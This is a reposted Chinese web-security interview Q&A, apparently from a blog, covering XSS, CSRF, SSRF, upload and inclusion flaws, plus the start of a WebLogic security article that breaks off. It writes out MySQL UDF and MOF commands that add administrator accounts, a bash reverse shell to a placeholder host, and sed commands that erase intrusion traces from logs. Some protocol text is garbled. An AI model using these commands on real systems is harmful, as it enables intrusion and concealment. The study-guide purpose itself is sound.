<h3 id="3、DOM型和XSS自动化测试或人工测试"><a href="#3、DOM型和XSS自动化测试或人工测试" class="headerlink" title="3、DOM型和XSS自动化测试或人工测试"></a>3、DOM型和XSS自动化测试或人工测试</h3><p>人工测试思路：找到类似document.write、innerHTML赋值、outterHTML赋值、window.location操作、写javascript:后内容、eval、setTimeout 、setInterval 等直接执行之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经过安全函数。自动化测试参看道哥的博客，思路是从输入入手，观察变量传递的过程，最终检查是否有在危险函数输出，中途是否有经过安全函数。但是这样就需要有一个javascript解析器，否则会漏掉一些通过js执行带入的部分内容。</p>
<p>在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进行检测，对不同类型的XSS检测方式实际上并没有太过细分的标准化检测方式，所以回答的很烂。。。</p>
<h3 id="4、如何快速发现XSS位置"><a href="#4、如何快速发现XSS位置" class="headerlink" title="4、如何快速发现XSS位置"></a>4、如何快速发现XSS位置</h3><h3 id="5、对于XSS怎么修补建议"><a href="#5、对于XSS怎么修补建议" class="headerlink" title="5、对于XSS怎么修补建议"></a>5、对于XSS怎么修补建议</h3><p>输入点检查：对用户输入的数据进行合法性检查，使用filter过滤敏感字符或对进行编码转义，针对特定类型数据进行格式检查。针对输入点的检查最好放在服务器端实现。</p>
<p>输出点检查：对变量输出到HTML页面中时，对输出内容进行编码转义，输出在HTML中时，对其进行HTMLEncode，如果输出在Javascript脚本中时，对其进行JavascriptEncode。对使用JavascriptEncode的变量都放在引号中并转义危险字符，data部分就无法逃逸出引号外成为code的一部分。还可以使用更加严格的方法，对所有数字字母之外的字符都使用十六进制编码。此外，要注意在浏览器中，HTML的解析会优先于Javascript的解析，编码的方式也需要考虑清楚，针对不同的输出点，我们防御XSS的方法可能会不同，这点可能在之后的文章会做下总结。</p>
<p>除此之外，还有做HTTPOnly对Cookie劫持做限制。</p>
<h3 id="6、XSS蠕虫的生产条件"><a href="#6、XSS蠕虫的生产条件" class="headerlink" title="6、XSS蠕虫的生产条件"></a>6、XSS蠕虫的生产条件</h3><p>正常情况下，一个是产生XSS点的页面不属于self页面，用户之间产生交互行为的页面，都可能造成XSS Worm的产生。<br>不一定需要存储型XSS</p>
<h2 id="十一、CSRF"><a href="#十一、CSRF" class="headerlink" title="十一、CSRF"></a>十一、CSRF</h2><h3 id="1、CSRF原理"><a href="#1、CSRF原理" class="headerlink" title="1、CSRF原理"></a>1、CSRF原理</h3><p>CSRF是跨站请求伪造攻击，由客户端发起,是由于没有在关键操作执行时进行是否由用户自愿发起的确认</p>
<h3 id="2、防御"><a href="#2、防御" class="headerlink" title="2、防御"></a>2、防御</h3><p>验证Referer<br>添加token</p>
<h3 id="3、token和referer做横向对比，谁安全等级高？"><a href="#3、token和referer做横向对比，谁安全等级高？" class="headerlink" title="3、token和referer做横向对比，谁安全等级高？"></a>3、token和referer做横向对比，谁安全等级高？</h3><p>token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。但是token的话，要保证其足够随机且不可泄露。(不可预测性原则)</p>
<h3 id="4、对referer的验证，从什么角度去做？如果做，怎么杜绝问题"><a href="#4、对referer的验证，从什么角度去做？如果做，怎么杜绝问题" class="headerlink" title="4、对referer的验证，从什么角度去做？如果做，怎么杜绝问题"></a>4、对referer的验证，从什么角度去做？如果做，怎么杜绝问题</h3><p>对header中的referer的验证，一个是空referer，一个是referer过滤或者检测不完善。为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。</p>
<h3 id="5、针对token-对token测试会注意哪方面被人，会对token的哪方面进行测试？"><a href="#5、针对token-对token测试会注意哪方面被人，会对token的哪方面进行测试？" class="headerlink" title="5、针对token,对token测试会注意哪方面被人，会对token的哪方面进行测试？"></a>5、针对token,对token测试会注意哪方面被人，会对token的哪方面进行测试？</h3><p>引用一段请教前辈的回答：</p>
<p>针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击<br>信息泄露有可能是缓存、日志、get，也有可能是利用跨站<br>很多跳转登录的都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了<br>另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过比如抢红包业务之类的</p>
<h2 id="十一、SSRF"><a href="#十一、SSRF" class="headerlink" title="十一、SSRF"></a>十一、SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<h3 id="1、监测"><a href="#1、监测" class="headerlink" title="1、监测"></a>1、监测</h3><p>SSRF漏洞的验证方法：</p>
<p>1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p>
<p>2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞</a> 4[1]</p>
<h3 id="2、SSRF漏洞的成因-防御-绕过"><a href="#2、SSRF漏洞的成因-防御-绕过" class="headerlink" title="2、SSRF漏洞的成因 防御 绕过"></a>2、SSRF漏洞的成因 防御 绕过</h3><p>成因：模拟服务器对其他服务器资源进行请求，没有做合法性验证。利用：构造恶意内网IP做探测，或者使用其余所支持的协议对其余服务进行攻击。防御：禁止跳转，限制协议，内外网限制，URL限制。绕过：使用不同协议，针对IP，IP格式的绕过，针对URL，恶意URL增添其他字符，@之类的。301跳转+dns rebindding。</p>
<h2 id="十二、上传"><a href="#十二、上传" class="headerlink" title="十二、上传"></a>十二、上传</h2><h3 id="1、文件上传漏洞原理"><a href="#1、文件上传漏洞原理" class="headerlink" title="1、文件上传漏洞原理"></a>1、文件上传漏洞原理</h3><p>由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件</p>
<h3 id="2、常见的上传绕过方式"><a href="#2、常见的上传绕过方式" class="headerlink" title="2、常见的上传绕过方式"></a>2、常见的上传绕过方式</h3><p>前端js验证：禁用js/burp改包<br>大小写<br>双重后缀名<br>过滤绕过 pphphp-&gt;php</p>
<h3 id="3、防护"><a href="#3、防护" class="headerlink" title="3、防护"></a>3、防护</h3><p>文件上传目录设置为不可执行<br>使用白名单判断文件上传类型<br>用随机数改写文件名和路径</p>
<h3 id="4、审查上传点的元素有什么意义？"><a href="#4、审查上传点的元素有什么意义？" class="headerlink" title="4、审查上传点的元素有什么意义？"></a>4、审查上传点的元素有什么意义？</h3><p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
<h2 id="十三、文件包含"><a href="#十三、文件包含" class="headerlink" title="十三、文件包含"></a>十三、文件包含</h2><h3 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h3><p>引入一段用户能控制的脚本或代码，并让服务器端执行 include()等函数通过动态变量的方式引入需要包含的文件；<br>用户能够控制该动态变量。</p>
<h3 id="2、导致文件包含的函数"><a href="#2、导致文件包含的函数" class="headerlink" title="2、导致文件包含的函数"></a>2、导致文件包含的函数</h3><p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfile(), … JSP/Servlet：ava.io.File(), java.io.Fil-eReader(), … ASP：include file, include virtual,</p>
<h3 id="3、本地文件包含"><a href="#3、本地文件包含" class="headerlink" title="3、本地文件包含"></a>3、本地文件包含</h3><p>能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞</p>
<h2 id="十四、逻辑漏洞"><a href="#十四、逻辑漏洞" class="headerlink" title="十四、逻辑漏洞"></a>十四、逻辑漏洞</h2><h3 id="1、金融行业常见逻辑漏洞"><a href="#1、金融行业常见逻辑漏洞" class="headerlink" title="1、金融行业常见逻辑漏洞"></a>1、金融行业常见逻辑漏洞</h3><p>单针对金融业务的 主要是数据的篡改(涉及金融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅羊毛，交易/订单信息泄露，水平越权对别人的账户查看或恶意操作，交易或业务步骤绕过。</p>
<h2 id="十五、中间人攻击"><a href="#十五、中间人攻击" class="headerlink" title="十五、中间人攻击"></a>十五、中间人攻击</h2><p>中间人攻击是一个（缺乏）相互认证的攻击；由于客户端与服务器之间在SSL握手的过程中缺乏相互认证而造成的漏洞</p>
<p>防御中间人攻击的方案通常基于一下几种技术</p>
<p>1.公钥基础建设PKI 使用PKI相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例子中都是只验证服务器，这样就造成了SSL握手环节的漏洞，而如果使用相互认证的的话，基本可以更强力的相互认证</p>
<p>2.延迟测试</p>
<p>使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。</p>
<p>3.使用其他形式的密钥交换形式</p>
<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>每台主机都有一个ARP缓存表，缓存表中记录了IP地址与MAC地址的对应关系，而局域网数据传输依靠的是MAC地址。在ARP缓存表机制存在一个缺陷，就是当请求主机收到ARP应答包后，不会去验证自己是否向对方主机发送过ARP请求包，就直接把这个返回包中的IP地址与MAC地址的对应关系保存进ARP缓存表中，如果原有相同IP对应关系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能</p>
<h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><p>1.在主机绑定网关MAC与IP地址为静态（默认为动态），命令：arp -s 网关IP 网关MAC</p>
<p>2.在网关绑定主机MAC与IP地址</p>
<p>3.使用ARP防火墙</p>
<h2 id="十六、DDOS"><a href="#十六、DDOS" class="headerlink" title="十六、DDOS"></a>十六、DDOS</h2><h3 id="1、DDOS原理"><a href="#1、DDOS原理" class="headerlink" title="1、DDOS原理"></a>1、DDOS原理</h3><p>利用合理的请求造成资源过载，导致服务不可用</p>
<p>syn洪流的原理</p>
<p>伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN/ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3～5次并且等待一个SYNTime（一般为30秒至2分钟），如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源（CPU和内存）来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试。最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。</p>
<p>CC攻击原理</p>
<p>对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。</p>
<h3 id="2、DOSS防护"><a href="#2、DOSS防护" class="headerlink" title="2、DOSS防护"></a>2、DOSS防护</h3><p>SYN Cookie/SYN Proxy、safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="十七、提权"><a href="#十七、提权" class="headerlink" title="十七、提权"></a>十七、提权</h2><h3 id="MySQL两种提权方式"><a href="#MySQL两种提权方式" class="headerlink" title="MySQL两种提权方式"></a>MySQL两种提权方式</h3><p>udf提权,mof提权</p>
<p>MySQL_UDF提取</p>
<p>要求: 1.目标系统是Windows(Win2000,XP,Win2003)；2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数 3.有root账号密码 导出udf: MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数 可以再mysql里输入select @@basedirshow variables like ‘%plugins%’ 寻找mysql安装路径 提权:</p>
<p>使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function cmdshell returns string soname ‘udf.dll’</span><br><span class="line">select cmdshell(‘net user arsch arsch &#x2F;add’);</span><br><span class="line">select cmdshell(‘net localgroup administrators arsch &#x2F;add’);</span><br><span class="line"></span><br><span class="line">drop function cmdshell;</span><br></pre></td></tr></table></figure>

<p>该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。</p>
<p>MySQL mof提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name  &#x3D; &quot;filtP2&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D;</span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user waitalone waitalone.cn &#x2F;add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer   &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中的第18行的命令，上传前请自己更改。</p>
<p>2、执行load_file及into dumpfile把文件导出到正确的位置即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load file(&#39;c:&#x2F;wmpub&#x2F;nullevt.mof&#39;) into dumpfile &#39;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mov&#39;</span><br></pre></td></tr></table></figure>

<p>执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。</p>
<h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h2 id="十八、特殊漏洞"><a href="#十八、特殊漏洞" class="headerlink" title="十八、特殊漏洞"></a>十八、特殊漏洞</h2><p>1、Struts2-045</p>
<p>2、Redis未授权</p>
<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</p>
<h3 id="利用条件和方法"><a href="#利用条件和方法" class="headerlink" title="利用条件和方法"></a>利用条件和方法</h3><h3 id="条件"><a href="#条件" class="headerlink" title="条件:"></a>条件:</h3><p>a、redis服务以root账户运行<br>b、redis无密码或弱密码进行认证<br>c、redis监听在0.0.0.0公网上</p>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法:"></a>方法:</h3><p>a、通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫<br>b、上传SSH公钥获得SSH登录权限<br>c、通过crontab反弹shell<br>d、slave主从模式利用</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>密码验证<br>降权运行<br>限制ip/修改端口</p>
<p>3、Jenkins未授权访问</p>
<p>4、MongoDB未授权访问</p>
<p>攻击者通过未授权访问进入脚本命令执行界面执行攻击指令</p>
<p>println “ifconfig -a”.execute().text 执行一些系统命令,利用wget下载webshell</p>
<p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。</p>
<h3 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h3><p>为MongoDB添加认证：1)MongoDB启动时添加–auth参数 2)给MongoDB添加用户：use admin #使用admin库 db.addUser(“root”, “123456”) #添加用户名root密码123456的用户 db.auth(“root”,“123456”) #验证下是否添加成功，返回1说明成功 2、禁用HTTP和REST端口 MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface=false 3、限制绑定IP 启动时加入参数 –bind_ip 127.0.0.1 或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1</p>
<p>5、Memcache未授权访问</p>
<p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>a、登录机器执行netstat -an |more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。</p>
<p>b、telnet 11211，或nc -vv 11211，提示连接成功表示漏洞存在</p>
<h3 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h3><p>a、设置memchached只允许本地访问 b、禁止外网访问Memcached 11211端口 c、编译时加上–enable-sasl，启用SASL认证</p>
<p>6、FFMPEG本地文件读取</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>通过调用加密API将payload加密放入一个会被执行的段字节中。但是具体回答工程中我只回答道了SSRF老洞，m3u8头，偏移量，加密。</p>
<h2 id="十九、安全知识"><a href="#十九、安全知识" class="headerlink" title="十九、安全知识"></a>十九、安全知识</h2><h3 id="1、WEB"><a href="#1、WEB" class="headerlink" title="1、WEB"></a>1、WEB</h3><p>常见WEB开发JAVA框架</p>
<p>STRUTS,SPRING 常见的java框架漏洞 其实面试官问这个问题的时候我不太清楚他要问什么，我提到struts的045 048，java常见反序列化。045 错误处理引入了ognl表达式 048 封装action的过程中有一步调用getstackvalue递归获取ognl表达式 反序列化 操作对象，通过手段引入。apache common的反射机制、readobject的重写，其实具体的我也记不清楚。。。然后这部分就结束了</p>
<p>同源策略</p>
<p>同源策略限制不同源对当前document的属性内容进行读取或设置。不同源的区分：协议、域名、子域名、IP、端口，以上有不同时即不同源。</p>
<p>Jsonp安全攻防技术，怎么写Jsonp的攻击页面</p>
<p>涉及到Jsonp的安全攻防内容</p>
<p>JSON劫持、Callback可定义、JSONP内容可定义、Content-type不为json。</p>
<p>攻击页面</p>
<p>JSON劫持，跨域劫持敏感信息，页面类似于</p>
<p>function wooyun(v){<br>alert(v.username);<br>}</p>
<p>Content-type不正确情况下，JSONP和Callback内容可定义可造成XSS。JSONP和FLASH及其他的利用参照知道创宇的JSONP安全攻防技术。</p>
<h3 id="2、PHP"><a href="#2、PHP" class="headerlink" title="2、PHP"></a>2、PHP</h3><p>php中命令执行涉及到的函数</p>
<p>代码执行：eval()、assert()、popen()、system()、exec()、shell_exec()、passthru(),pcntl_exec(),call_user_func_array(),create_function()</p>
<p>文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p>
<p>命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()<br>安全模式下绕过php的disable fuction</p>
<p>DL函数，组件漏洞，环境变量。<br>PHP弱类型</p>
<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<p>0e开头的字符串等于0</p>
<h3 id="3、数据库"><a href="#3、数据库" class="headerlink" title="3、数据库"></a>3、数据库</h3><p>各种数据库文件存放的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql:</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F; </span><br><span class="line">C:\ProgramData\MySQL\MySQL Server 5.6\Data\</span><br><span class="line">oracle:$ORACLE_BASE&#x2F;oradata&#x2F;$ORACLE_SID&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="4、系统"><a href="#4、系统" class="headerlink" title="4、系统"></a>4、系统</h3><p>如何清理日志</p>
<p>meterpreter: clearev<br>入侵 Linux 服务器后需要清除哪些日志？</p>
<p>web日志，如apache的access.log,error.log。直接将日志清除过于明显,一般使用sed进行定向清除</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e.g. sed -i -e ‘&#x2F;192.169.1.1&#x2F;d’</span><br></pre></td></tr></table></figure>

<p>history命令的清除，也是对~/.bash_history进行定向清除</p>
<p>wtmp日志的清除，/var/log/wtmp</p>
<p>登录日志清除 /var/log/secure<br>LINUX<br>查看当前端口连接的命令有哪些？netstat 和 ss 命令的区别和优缺点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -antp&#96; &#96;ss -l</span><br></pre></td></tr></table></figure>

<p>ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。<br>反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls &#x2F;proc</span><br></pre></td></tr></table></figure>

<p>系统信息，硬件信息，内核版本，加载的模块，进程<br>linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。</p>
<p>/etc/ssh/sshd___configiptables配置<br>如何一条命令查看文件内容最后一百行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tail -n 100 filename</span><br></pre></td></tr></table></figure>

<p>Windows<br>如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。</p>
<h3 id="5、密码学"><a href="#5、密码学" class="headerlink" title="5、密码学"></a>5、密码学</h3><p>AES／DES的具体工作步骤<br>RSA算法</p>
<p>加密:<br>密文＝明文^EmodN</p>
<p>RSA加密是对明文的E次方后除以N后求余数的过程<br>公钥＝(E,N)</p>
<p>解密:<br>明文＝密文^DmodN 私钥＝(D,N)</p>
<p>三个参数n,e1,e2</p>
<p>n是两个大质数p,q的积<br>分组密码的加密模式<br>如何生成一个安全的随机数？</p>
<p>引用之前一个学长的答案，可以通过一些物理系统生成随机数，如电压的波动、磁盘磁头读/写时的寻道时间、空中电磁波的噪声等。<br>SSL握手过程</p>
<p>建立TCP连接、客户端发送SSL请求、服务端处理SSL请求、客户端发送公共密钥加密过的随机数据、服务端用私有密钥解密加密后的随机数据并协商暗号、服务端跟客户端利用暗号生成加密算法跟密钥key、之后正常通信。这部分本来是忘了的，但是之前看SSL Pinning的时候好像记了张图在脑子里，挣扎半天还是没敢确定，遂放弃。。。<br>对称加密与非对称加密的不同，分别用在哪些方面</p>
<h3 id="6、TCP-IP"><a href="#6、TCP-IP" class="headerlink" title="6、TCP/IP"></a>6、TCP/IP</h3><p>TCP三次握手的过程以及对应的状态转换</p>
<p>（1）客户端向服务器端发送一个SYN包，包含客户端使用的端口号和初始序列号x;<br>（2）服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号xx1和服务器端的初始序列号y;<br>（3）客户端收到服务器端返回的SYNSACK报文后，向服务器端返回一个确认号为yy1、序号为xx1的ACK报文，一个标准的TCP连接完成。<br>TCP和UDP协议区别</p>
<p>tcp面向连接,udp面向报文 tcp对系统资源的要求多 udp结构简单 tcp保证数据完整性和顺序，udp不保证<br>https的建立过程</p>
<p>a、客户端发送请求到服务器端<br>b、服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在<br>c、客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端<br>d、服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端<br>e、客户端使用共享密钥解密数据<br>f、SSL加密建立</p>
<h3 id="7、流量分析"><a href="#7、流量分析" class="headerlink" title="7、流量分析"></a>7、流量分析</h3><p>wireshark简单的过滤规则</p>
<p>过滤ip:</p>
<p>过滤源ip地址:ip.src1.1.1.1;,目的ip地址:ip.dst1.1.1.1;</p>
<p>过滤端口:</p>
<p>过滤80端口:tcp.port80,源端口:tcp.srcport80,目的端口:tcp.dstport==80</p>
<p>协议过滤:</p>
<p>直接输入协议名即可,如http协议http</p>
<p>http模式过滤:</p>
<p>过滤get/post包http.request.mothod==”GET/POST”</p>
<h3 id="8、防火墙"><a href="#8、防火墙" class="headerlink" title="8、防火墙"></a>8、防火墙</h3><p>简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</p>
<p>本文转自网络，侵删。</p>
]]></content>
  </entry>
  <entry>
    <title>关于WebLogic安全性探讨</title>
    <url>/2020/08/19/jiami/</url>
    <content><![CDATA[<h2 id="1-什么是WebLogic"><a href="#1-什么是WebLogic" class="headerlink" title="1    什么是WebLogic"></a>1    什么是WebLogic</h2><p>WebLogic是美国bea公司出品的一个webserver，如同我们使用的IIS，APACHE，确且的说是一个基于j2ee**<a href="http://lib.csdn.net/base/architecture">架构</a>**的中间件，webserver是用来构建网站的必要软件用来解析发布网页等功能，它是用纯<a href="http://lib.csdn.net/base/java"><strong>Java</strong></a>开发的。目前WebLogic在世界webserver市场上占有最大的份额，其他还有像IBM的websphere，免费的tomcat、resin等webserver软件。</p>
<p>WebLogic对于整日游走于安全行业的人来说并不陌生，网站拥有者可利用WebLogic搭建web服务，可充分利用其扩展性、部署灵活、支持多种标准等优势来；所谓没有绝对的安全，所以作为成熟的产品WebLogic每年也会出现各种命令执行、反序列等通用漏洞，而做为攻击者就可充分利用这些漏洞去攻击系统危害用户利益。</p>
<p>WebLogic在世界排名前10的国家如下：</p>
<p><img src="https://image.3001.net/images/20190331/1554005314_5ca03d42934f0.png!small" alt="图片.png"></p>
<p>通过初步统计，WebLogic在国内的应用范围比较广，支撑着很多企业的核心业务，尤其是在金融、电力、政府等行业，其中还有很多内网应用系统。</p>
<p>国内中间件利用情况统计图如下：</p>
<p><img src="https://image.3001.net/images/20190331/1554005324_5ca03d4c0ca82.png!small" alt="图片.png"></p>
<h2 id="2-WebLogic漏洞分析"><a href="#2-WebLogic漏洞分析" class="headerlink" title="2    WebLogic漏洞分析"></a>2    WebLogic漏洞分析</h2><p>随着近几年互联网的安全日益重视，WebLogic也被曝出大量漏洞，通过查看cve相关资料，最早的WebLogic漏洞是<a href="http://cve.scap.org.cn/CVE-2000-0499.html">CVE-2000-0499</a>，存在于是WebLogic3.1.8到4.5.1之间的版本，远程攻击者可通过该漏洞来查看jsp程序的源码，通过cve官方统计从2000年至今WebLogic已经被爆出268个漏洞。</p>
<p>WebLogic被曝出多个反序列化漏洞，Oracle官方相继发布了一系列反序列化漏洞补丁。但是近期，WebLogic又被曝出之前的反序列化漏洞补丁存在绕过安全风险，用户更新补丁后，仍然存在被绕过并成功执行远程命令攻击的情况。</p>
<p>序列化指的是把对象转换成字节流，便于保存在内存、文件、数据库中；而反序列化则是其逆过程，由字节流还原成对象。Java中ObjectOutputStream类的writeObject()方法可以实现序列化，ObjectInputStream类的readObject()方法用于反序列化。</p>
<p>java类ObjectInputStream在执行反序列化时，并不会对自身的输入进行检查，这就说明恶意攻击者可能也可以构建特定的输入，在ObjectInputStream类反序列化之后会产生非正常结果，利用这一方法就可以实现远程执行任意代码。</p>
<p>WebLogic采用黑名单的方式过滤危险的反序列化类，所以只要找到不在黑名单范围内的反序列化类就可以绕过过滤，执行系统命令。这次的漏洞就是利用了这一点，通过 JRMP（Java Remote Messaging Protocol ，是特定于 Java 技术的、用于查找和引用远程对象的协议）协议达到执行任意反序列化内容。</p>
<p>恶意攻击者可利用反序列话漏洞，通过构造恶意请求报文远程执行命令，如查看服务器上相关敏感文件、进行木马的远程上传等，致使用户敏感文件泄露，服务器遭受攻击等，存在反序列化漏洞的站点如下：</p>
<p>除了反序列化漏洞，WebLogic还有存在ssrf、弱口令、xss等安全漏洞，SetupUDDIExploer.jsp就存在ssrf和xss漏洞，xss利用代码如下：</p>
<p>Ssrf漏洞代码如下</p>
<p>通过提交如下url：</p>
